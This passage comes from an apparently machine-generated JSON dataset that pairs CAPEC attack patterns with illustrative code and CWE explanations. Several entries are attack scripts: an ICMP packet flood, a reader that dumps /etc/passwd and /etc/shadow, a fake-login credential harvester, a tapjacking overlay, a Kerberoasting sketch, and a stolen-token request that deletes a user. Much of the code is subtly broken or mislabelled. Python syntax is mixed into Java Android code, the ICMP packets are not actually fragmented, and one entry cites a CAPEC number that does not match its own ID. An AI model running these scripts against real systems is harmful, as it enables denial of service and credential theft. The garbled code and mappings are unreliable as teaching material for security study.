        "code_snippet": "import socket\n\n# Function to create a fragmented ICMP packet\ndef create_fragmented_icmp_packet(fragment_size):\n    icmp_header = b'\\x08\\x00'  # ICMP Echo Request\n    payload = b'A' * fragment_size\n    return icmp_header + payload\n\n# Function to send fragmented ICMP packets\ndef send_fragmented_icmp(target_ip, fragment_size, num_fragments):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    for _ in range(num_fragments):\n        packet = create_fragmented_icmp_packet(fragment_size)\n        sock.sendto(packet, (target_ip, 1))\n    sock.close()\n\n# Target IP and parameters\nTARGET_IP = '192.168.1.1'\nFRAGMENT_SIZE = 1480  # Fragment size\nNUM_FRAGMENTS = 10000  # Number of fragments to send\n\n# Send fragmented ICMP packets to the target\nsend_fragmented_icmp(TARGET_IP, FRAGMENT_SIZE, NUM_FRAGMENTS)",
        "description": "This Python code snippet demonstrates a basic implementation of an ICMP Fragmentation attack. The `create_fragmented_icmp_packet` function generates a fragmented ICMP packet with a specified fragment size. The `send_fragmented_icmp` function sends a large number of these fragmented packets to a target IP address. The parameters `TARGET_IP`, `FRAGMENT_SIZE`, and `NUM_FRAGMENTS` define the target IP address, the size of each fragment, and the number of fragments to send, respectively. This code embodies the main idea of the CAPEC by attempting to overwhelm the target system with fragmented ICMP packets, potentially leading to resource exhaustion or a crash. The related CWEs provide context on potential weaknesses, such as lack of resource limits (CWE-770) and improper resource release (CWE-404), which can be exploited by this type of attack."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-73: External Control of File Name or Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef find_sensitive_files(base_path, file_list):\n    sensitive_files = []\n    for file_name in file_list:\n        file_path = os.path.join(base_path, file_name)\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as file:\n                content = file.read()\n                sensitive_files.append((file_path, content))\n    return sensitive_files\n\n# Example usage\nbase_path = '/etc/'  # Untrusted base path\nfile_list = ['passwd', 'shadow', 'config.json']  # Potentially sensitive files\n\n# This will expose the content of sensitive files if they exist\nsensitive_files = find_sensitive_files(base_path, file_list)\nfor file_path, content in sensitive_files:\n    print(f'Found sensitive file: {file_path}')\n    print(content)",
        "description": "This Python code snippet demonstrates a file discovery process that embodies the main idea of the CAPEC 'File Discovery'. The function `find_sensitive_files` takes a base path and a list of file names, then checks if these files exist in the specified path. If they do, it reads and stores their content. This code is vulnerable to several CWEs: \n- CWE-73: The file paths are influenced by user input, allowing potential access to sensitive files.\n- CWE-200: The content of sensitive files is exposed to unauthorized actors.\n- CWE-529: Access control list files might be exposed if they are stored in accessible directories.\n- CWE-426: The base path is untrusted and can lead to searching in unsafe directories.\n- CWE-646: The code relies on file names/extensions to determine which files to read, which can be exploited by attackers."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport shutil\n\n# Simulate sensitive information\nsensitive_info = 'User password: 12345'\n\n# Save sensitive information to a temporary file\nwith open('temp_screenshot.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate app going to background and OS taking a screenshot\nos.system('screencapture temp_screenshot.png')\n\n# Simulate an adversary accessing the screenshot\nwith open('temp_screenshot.png', 'rb') as screenshot:\n    data = screenshot.read()\n    print('Adversary accessed screenshot data:', data)\n\n# Clean up temporary files\nos.remove('temp_screenshot.txt')\nos.remove('temp_screenshot.png')",
        "description": "This Python code snippet simulates the CAPEC 'Probe iOS Screenshots' attack. It demonstrates how sensitive information (e.g., a user's password) can be exposed through temporary screenshots created by the OS when an application goes to the background. The code creates a temporary file containing sensitive information, simulates taking a screenshot, and then shows how an adversary could access this screenshot. This example highlights CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) by showing how sensitive data can be exposed through screenshots. It also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by demonstrating unauthorized access to system-level information (the screenshot)."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.SENSITIVE_ACTION\")) {\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n// This component is exported without proper restrictions\n<receiver android:name=\".VulnerableReceiver\"\n    android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.SENSITIVE_ACTION\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles intents, embodying the main idea of the CAPEC 'Android Intent Intercept'. The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION'. It does not verify the source of the intent (CWE-925), uses an implicit intent for sensitive data (CWE-927), and is exported without proper restrictions (CWE-926). This makes it possible for a malicious application to intercept, modify, or block the intent, leading to potential information disclosure or denial of service."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\nclass MyWebViewClient(WebViewClient):\n    def onPageFinished(self, view, url):\n        view.loadUrl(\"javascript:window.AndroidInterface.processHTML(document.getElementsByTagName('html')[0].innerHTML);\")\n\nclass MainActivity:\n    def __init__(self):\n        self.webview = WebView()\n        self.webview.getSettings().setJavaScriptEnabled(True)\n        self.webview.addJavascriptInterface(self, \"AndroidInterface\")\n        self.webview.setWebViewClient(MyWebViewClient())\n        self.webview.loadUrl(\"http://example.com\")\n\n    @JavascriptInterface\n    def processHTML(self, html):\n        # Process the HTML content\n        print(html)\n\n# Simulate the MainActivity\nmain_activity = MainActivity()",
        "description": "This Python code snippet simulates an Android application using a WebView component to load a web page. The WebView is configured to enable JavaScript and injects a JavaScript interface named 'AndroidInterface'. When the page finishes loading, it executes JavaScript to retrieve the HTML content of the page and passes it to the 'processHTML' method. This method, marked with @JavascriptInterface, processes the HTML content. This setup is vulnerable to WebView Injection (CAPEC-165) as it allows an adversary to inject malicious code into the web page context. The code also demonstrates CWE-749 (Exposed Dangerous Method or Function) by exposing the 'processHTML' method to JavaScript without proper restrictions, and CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the loaded URL."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        // Prompt the user to enter sensitive data\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses an implicit intent to launch a trusted activity. The MainActivity class creates an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. However, this implicit intent can be intercepted by a malicious application, which can then launch a counterfeit activity (MaliciousActivity) that mimics the trusted activity's user interface. The malicious activity can prompt the user to enter sensitive data, believing they are interacting with the trusted activity. This example embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights related CWEs such as the use of implicit intents for sensitive communication (CWE-927) and improper verification of the source of a communication channel (CWE-940)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        // CWE-926: Improper Export of Android Application Components\n        filter.addAction(\"com.example.TRUSTED_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nIntent intent = new Intent(\"com.example.TRUSTED_ACTION\");\nintent.putExtra(\"sensitive_data\", \"This is sensitive\");\ncontext.sendBroadcast(intent);",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles intents, embodying the main idea of the CAPEC 'Intent Spoof'. The BroadcastReceiver does not verify the source of the intent (CWE-925), leading to potential unauthorized access to sensitive data (CWE-284). The receiver is registered with an action that can be triggered by any application (CWE-926), and an implicit intent is used to send sensitive data (CWE-927). This setup allows a malicious application to spoof an intent and potentially access or manipulate sensitive information."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to enable JavaScript and an interface named 'AndroidInterface' is registered, exposing the 'showToast' method to JavaScript. This method can be called from any web page loaded in the WebView, potentially allowing a malicious web page to exploit this interface to execute arbitrary code within the context of the application. This embodies the CAPEC 'WebView Exposure' and related CWEs such as 'Improper Access Control' (CWE-284) and 'Exposed Dangerous Method or Function' (CWE-749)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-285: Improper Authorization\n# CWE-506: Embedded Malicious Code\n\ndef impersonate_user():\n    # CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n    # This function impersonates a user by using their token\n    token = ctypes.windll.advapi32.LogonUserW('username', 'domain', 'password', 2, 0, ctypes.byref(ctypes.c_void_p()))\n    if token == 0:\n        raise Exception('Impersonation failed')\n    ctypes.windll.advapi32.ImpersonateLoggedOnUser(token)\n\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n# Simulate a malicious task impersonation\nclass MaliciousTask:\n    def __init__(self):\n        self.sensitive_data = 'Sensitive Information'\n\n    def perform_task(self):\n        # Malicious code that steals sensitive information\n        print(f'Stealing data: {self.sensitive_data}')\n\nif __name__ == '__main__':\n    try:\n        impersonate_user()\n        task = MaliciousTask()\n        task.perform_task()\n    except Exception as e:\n        print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a task impersonation attack, where a malicious application impersonates a user to steal sensitive information. The `impersonate_user` function uses Windows API calls to impersonate a user by obtaining their token (CWE-520, CWE-556). The `MaliciousTask` class simulates a task that appears routine but contains embedded malicious code to steal sensitive data (CWE-506). The code also highlights improper authorization (CWE-285) and improper restriction of UI layers (CWE-1021) by not verifying the legitimacy of the task being performed."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\n\n# Malicious application registering a custom URL scheme\nclass MaliciousApp:\n    def __init__(self):\n        self.scheme = 'targetapp://'\n\n    def handle_url(self, url):\n        if url.startswith(self.scheme):\n            self.display_fake_login()\n\n    def display_fake_login(self):\n        # Mimic the target application's login screen\n        print('Welcome to TargetApp! Please log in.')\n        username = input('Username: ')\n        password = input('Password: ')\n        self.store_credentials(username, password)\n\n    def store_credentials(self, username, password):\n        # Store the stolen credentials\n        with open('stolen_credentials.txt', 'a') as f:\n            f.write(f'Username: {username}, Password: {password}\\n')\n\n# Simulate receiving a URL intended for the target application\nmalicious_app = MaliciousApp()\nmalicious_app.handle_url('targetapp://login?user=example')",
        "description": "This Python code snippet demonstrates a simplified version of a Scheme Squatting attack. The malicious application registers a custom URL scheme ('targetapp://') intended for a target application that is not installed. When a URL with this scheme is received, the malicious application handles it and displays a fake login screen, mimicking the target application. The user is tricked into entering their credentials, which are then stored by the malicious application. This code embodies the main idea of the CAPEC by showing how an adversary can exploit custom URL schemes to steal sensitive information. The related CWEs are represented by the embedded malicious code (CWE-506), improper authorization in the custom URL scheme handler (CWE-939), and the generation of sensitive information (CWE-209)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.title('Innocent App')\n        self.root.geometry('300x200')\n\n        # Create a transparent overlay\n        self.overlay = tk.Toplevel(self.root)\n        self.overlay.geometry('300x200')\n        self.overlay.attributes('-alpha', 0.0)  # Fully transparent\n        self.overlay.attributes('-topmost', True)\n\n        # Add a button to the overlay that triggers a malicious action\n        self.malicious_button = tk.Button(self.overlay, text='Click Me', command=self.malicious_action)\n        self.malicious_button.place(x=100, y=100)\n\n    def malicious_action(self):\n        print('Malicious action triggered!')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = MaliciousApp(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a basic example of a tapjacking attack using the Tkinter library. The main application window ('Innocent App') is overlaid with a fully transparent window that contains a button. When the user interacts with the visible application, they may unknowingly click the button on the transparent overlay, triggering a malicious action. This example embodies the concept of tapjacking by misleading the user into interacting with an interface that is not visible to them. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the transparent overlay to capture user interactions intended for the underlying application."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\n\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n# CWE-1263: Improper Physical Access Control\n\n# Sensitive information\nsensitive_data = 'SuperSecretPassword123'\n\n# Store sensitive information in a file without proper access control\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Log sensitive system information\nos.system('echo System Info: $(uname -a) >> system_info.log')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Simulate a process that could be vulnerable to side-channel attacks\nfor i in range(1000000):\n    pass  # Simulate some processing",
        "description": "This Python code snippet demonstrates several vulnerabilities related to physical theft and improper handling of sensitive information. It stores sensitive data in a file without proper access control (CWE-922, CWE-921), logs sensitive system information (CWE-497), and simulates a process that could be vulnerable to side-channel attacks (CWE-1300). The code represents the main idea of the CAPEC by showing how an adversary with physical access could exploit these weaknesses to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# Simulate a login process where sensitive information is exposed\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# Simulate a shoulder surfing vulnerability by printing sensitive information\nprint(f'Username: {username}')\nprint(f'Password: {password}')  # CWE-200, CWE-359, CWE-319\n\n# Simulate truncation of security-relevant information\ntruncated_password = password[:3] + '***'  # CWE-222\nprint(f'Truncated Password: {truncated_password}')\n\n# Simulate exposure of sensitive system information\nsystem_info = 'OS: Linux, Version: 5.4.0-42-generic'  # CWE-497\nprint(f'System Info: {system_info}')",
        "description": "This Python code snippet simulates a scenario where sensitive information is exposed, embodying the concept of a shoulder surfing attack. The code prompts the user to enter a username and password, then prints this sensitive information to the console, making it visible to anyone who might be looking over the user's shoulder (CWE-200, CWE-359, CWE-319). Additionally, it demonstrates the truncation of security-relevant information by partially masking the password (CWE-222) and exposes sensitive system information (CWE-497). This example highlights the risks associated with improper handling and display of sensitive data, which can be exploited through shoulder surfing."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import subprocess\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Simulate requesting a Kerberos ticket for a service account\nservice_account = 'service_account@domain.com'\npassword = 'weakpassword'  # CWE-521: Weak Password Requirements\n\n# Request a Kerberos ticket (TGT)\nsubprocess.run(['kinit', service_account], input=password.encode(), check=True)\n\n# Save the ticket to disk (CWE-522: Insufficiently Protected Credentials)\nticket_file = '/tmp/krb5cc_{}'.format(os.getuid())\nsubprocess.run(['klist', '-c', ticket_file], check=True)\n\n# Extract the ticket for offline brute-forcing\nwith open(ticket_file, 'rb') as f:\n    ticket_data = f.read()\n\n# Simulate brute-forcing the ticket (CWE-308, CWE-309)\ndef brute_force_ticket(ticket_data):\n    # This is a placeholder for the actual brute-force logic\n    print('Brute-forcing ticket...')\n    return 'cracked_password'\n\ncracked_password = brute_force_ticket(ticket_data)\nprint(f'Cracked password: {cracked_password}')",
        "description": "This Python code snippet demonstrates a simplified version of a Kerberoasting attack, which is described in the CAPEC. The code requests a Kerberos ticket for a service account using weak credentials (CWE-521), saves the ticket to disk (CWE-522), and then simulates brute-forcing the ticket to obtain the service account's password. The code highlights vulnerabilities such as the use of single-factor authentication (CWE-308), reliance on password systems (CWE-309), and insufficiently protected credentials (CWE-522). The code is intended to illustrate how an attacker might exploit these weaknesses to gain unauthorized access to a service account."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# Malicious application leveraging a trusted user's session\nclass MaliciousApp:\n    def __init__(self, session_token):\n        self.session_token = session_token\n        self.saas_url = 'https://saas.example.com/api'\n\n    def perform_malicious_action(self):\n        headers = {\n            'Authorization': f'Bearer {self.session_token}'\n        }\n        # Exploiting improper authorization and origin validation error\n        response = requests.post(f'{self.saas_url}/sensitive_action', headers=headers, json={'action': 'delete_user', 'user_id': '12345'})\n        if response.status_code == 200:\n            print('Malicious action performed successfully')\n        else:\n            print('Failed to perform malicious action')\n\n# Example usage\n# Assume the session_token is obtained through some means (e.g., social engineering, XSS, etc.)\nsession_token = 'trusted_user_session_token'\nmalicious_app = MaliciousApp(session_token)\nmalicious_app.perform_malicious_action()",
        "description": "This Python code snippet demonstrates a malicious application that leverages a trusted user's session token to perform unauthorized actions on a SaaS application. The `MaliciousApp` class takes a session token as an argument, which it uses to authenticate requests to the SaaS API. The `perform_malicious_action` method sends a POST request to a sensitive endpoint (`/sensitive_action`) with the session token in the Authorization header, attempting to delete a user. This embodies the CAPEC 'SaaS User Request Forgery' by exploiting the implicit trust placed on the authenticated session. The code also highlights related CWEs such as Origin Validation Error (CWE-346) and Improper Authorization (CWE-285) by not properly verifying the source of the request and failing to correctly perform authorization checks."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport base64\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\nDEBUG = True\nSECRET_KEY = 'super_secret_key'\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file_path):\n    if not file_path.endswith('.txt'):\n        raise ValueError('Only .txt files are allowed')\n    with open(file_path, 'r') as file:\n        data = file.read()\n    return data\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\ndef get_system_info():\n    if DEBUG:\n        return os.popen('uname -a').read()\n    return 'System info is restricted'\n\n# CWE-506: Embedded Malicious Code\n# Malicious code to exfiltrate sensitive data\ndef exfiltrate_data(data):\n    encoded_data = base64.b64encode(data.encode('utf-8'))\n    # Simulate sending data to an attacker's server\n    print(f'Exfiltrating data: {encoded_data}')\n\n# Main function to demonstrate the attack\nif __name__ == '__main__':\n    # Upload a dangerous file\n    try:\n        file_data = upload_file('malicious_script.py')\n    except ValueError as e:\n        print(e)\n\n    # Get sensitive system information\n    system_info = get_system_info()\n    print(f'System Info: {system_info}')\n\n    # Exfiltrate sensitive data\n    exfiltrate_data(system_info)",
        "description": "This Python code snippet demonstrates a scenario where an attacker infiltrates a software development environment, leveraging several common weaknesses. The code includes:\n\n1. **CWE-215**: Sensitive information (SECRET_KEY) is included in debugging code, which could be exposed if debugging is enabled in production.\n2. **CWE-434**: A function `upload_file` that restricts file uploads to `.txt` files, but an attempt is made to upload a dangerous file (`malicious_script.py`).\n3. **CWE-497 and CWE-200**: A function `get_system_info` that exposes sensitive system information when debugging is enabled.\n4. **CWE-506**: A function `exfiltrate_data` that simulates the exfiltration of sensitive data by encoding it and printing it, representing the act of sending it to an attacker's server.\n\nThe main function demonstrates the attack by attempting to upload a dangerous file, retrieving sensitive system information, and exfiltrating that information."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import third_party_component\n\nclass Device:\n    def __init__(self):\n        # Dependency on a third-party component that may be vulnerable\n        self.component = third_party_component.load_component()\n        \n        # Simulate reliance on a component that is not updateable\n        if not self.component.is_updateable():\n            raise Exception('Component is not updateable')\n        \n        # Simulate reliance on an insufficiently trustworthy component\n        if not self.component.is_trustworthy():\n            raise Exception('Component is not trustworthy')\n        \n        # Improper protection against voltage and clock glitches\n        if not self.component.has_voltage_clock_protection():\n            raise Exception('Improper protection against voltage and clock glitches')\n        \n        # Exposure of sensitive information due to shared microarchitectural predictor state\n        if self.component.exposes_sensitive_info():\n            raise Exception('Exposure of sensitive information due to shared microarchitectural predictor state')\n\n    def perform_baseline(self):\n        # Perform baseline operations\n        self.component.calibrate()\n        self.component.adjust_settings()\n        print('Baseline operations completed')\n\n# Simulate the substitution of a malicious component during baselining\ntry:\n    device = Device()\n    device.perform_baseline()\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet simulates the scenario described in the CAPEC 'Hardware Component Substitution During Baselining'. The 'Device' class relies on a third-party component that may have several vulnerabilities as described by the related CWEs. The code checks for vulnerabilities such as dependency on a non-updateable component, reliance on an insufficiently trustworthy component, improper protection against voltage and clock glitches, and exposure of sensitive information due to shared microarchitectural predictor state. During the baselining process, if any of these vulnerabilities are detected, an exception is raised, simulating the potential issues that could arise from substituting a malicious component during the product development phase."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\n# CWE-1263: Improper Physical Access Control\n# Simulating access to sensitive documentation\nsensitive_docs_path = '/path/to/sensitive/docs'\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Reading sensitive documentation\ntry:\n    with open(sensitive_docs_path, 'r') as file:\n        sensitive_data = file.read()\nexcept FileNotFoundError:\n    print('Sensitive documentation not found.')\n    sensitive_data = ''\n\n# CWE-1059: Insufficient Technical Documentation\n# Simulating insufficient documentation by not providing full details\nif 'restricted_technology' in sensitive_data:\n    print('Restricted technology found in documentation.')\n    # CWE-695: Use of Low-Level Functionality\n    # Using low-level functionality to alter documentation\n    altered_data = sensitive_data.replace('restricted_technology', 'allowed_technology')\n    \n    # CWE-222: Truncation of Security-relevant Information\n    # Truncating the altered data to obscure the change\n    truncated_data = altered_data[:100]  # Truncate to first 100 characters\n    \n    # Writing the altered and truncated data back to the file\n    with open(sensitive_docs_path, 'w') as file:\n        file.write(truncated_data)\n    print('Documentation altered and truncated.')\nelse:\n    print('No restricted technology found in documentation.')",
        "description": "This Python code snippet simulates the main idea of the CAPEC 'Documentation Alteration to Circumvent Dial-down'. It demonstrates how an attacker with physical access to sensitive documentation (CWE-1263) can read and alter the documentation to replace restricted technology with allowed technology (CWE-200, CWE-1059). The code uses low-level functionality to perform the alteration (CWE-695) and truncates the altered data to obscure the change (CWE-222). This represents how an attacker might manipulate documentation to circumvent restrictions on advanced technology."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemDocumentation:\n    def __init__(self, system_capabilities):\n        self.system_capabilities = system_capabilities\n        self.documentation = {}\n\n    def add_documentation(self, component, description):\n        # CWE-1059: Insufficient Technical Documentation\n        if component not in self.system_capabilities:\n            raise ValueError(\"Component not recognized\")\n        self.documentation[component] = description\n\n    def alter_documentation(self, component, new_description):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        if component not in self.documentation:\n            raise ValueError(\"Component documentation not found\")\n        # CWE-573: Improper Following of Specification by Caller\n        # CWE-695: Use of Low-Level Functionality\n        self.documentation[component] = new_description\n\n    def get_documentation(self, component):\n        # CWE-1053: Missing Documentation for Design\n        return self.documentation.get(component, \"No documentation available\")\n\n# Example usage\nsystem_capabilities = {\"componentA\": \"Initial capability description\"}\ndoc = SystemDocumentation(system_capabilities)\ndoc.add_documentation(\"componentA\", \"Initial documentation\")\n# Attacker alters the documentation\ntry:\n    doc.alter_documentation(\"componentA\", \"Malicious altered documentation\")\nexcept ValueError as e:\n    print(e)\n\nprint(doc.get_documentation(\"componentA\"))",
        "description": "This Python code snippet represents a simplified model of a system documentation class that can be manipulated to introduce vulnerabilities, embodying the main idea of the CAPEC 'Documentation Alteration to Produce Under-performing Systems'. The class allows adding, altering, and retrieving documentation for system components. The code includes potential CWE-related issues: insufficient technical documentation (CWE-1059), exposure of sensitive system information (CWE-497), improper following of specifications (CWE-573), use of low-level functionality (CWE-695), and missing documentation for design (CWE-1053). An attacker with access to this class could alter the documentation to introduce flaws, impacting the system's effectiveness."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self, config):\n        # Missing documentation for design\n        self.config = config\n        self.state = None\n\n    def initialize(self):\n        # Insufficient technical documentation\n        self.state = 'initialized'\n\n    def execute(self, command):\n        # Incorrect provision of specified functionality\n        if command == 'start':\n            self.state = 'running'\n        elif command == 'stop':\n            self.state = 'stopped'\n        else:\n            # Improper following of specification by caller\n            raise ValueError('Unknown command')\n\n    def dynamic_code_execution(self, code):\n        # Improper control of dynamically-managed code resources\n        exec(code)\n\n# Example usage\ncomponent = SystemComponent(config={})\ncomponent.initialize()\ncomponent.execute('start')\ncomponent.dynamic_code_execution('print(\"Executing dynamic code\")')",
        "description": "This Python code snippet represents a system component that suffers from several vulnerabilities as described in the CAPEC and related CWEs. The class `SystemComponent` has an `__init__` method with insufficient documentation for its design and configuration. The `initialize` method lacks technical documentation, making it unclear how the initialization process works. The `execute` method does not correctly follow the specifications, as it raises an error for unknown commands without proper handling. Additionally, the `dynamic_code_execution` method improperly controls dynamically-managed code resources by using the `exec` function, which can execute arbitrary code and pose significant security risks. This code embodies the main idea of the CAPEC by demonstrating how altering documentation and design processes can lead to exploitable weaknesses in a system."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import hashlib\n\nclass TrustedComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def process(self):\n        return hashlib.sha256(self.data.encode()).hexdigest()\n\nclass CounterfeitComponent(TrustedComponent):\n    def process(self):\n        # Malicious behavior: tampering with the data before processing\n        tampered_data = self.data + 'malicious_code'\n        return hashlib.sha256(tampered_data.encode()).hexdigest()\n\n# Simulating the use of a counterfeit component in the assembly process\ncomponent = CounterfeitComponent('sensitive_data')\nresult = component.process()\nprint(f\"Processed data: {result}\")",
        "description": "This Python code snippet demonstrates the concept of 'Counterfeit Hardware Component Inserted During Product Assembly' by simulating a counterfeit component that introduces malicious behavior. The `TrustedComponent` class represents a legitimate component with a `process` method that securely hashes data. The `CounterfeitComponent` class inherits from `TrustedComponent` but overrides the `process` method to tamper with the data by appending 'malicious_code' before hashing. This represents the CWE-506 (Embedded Malicious Code) and CWE-1357 (Reliance on Insufficiently Trustworthy Component). The counterfeit component is then used in place of the trusted one, illustrating how an adversary could introduce malicious behavior during the product assembly process."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
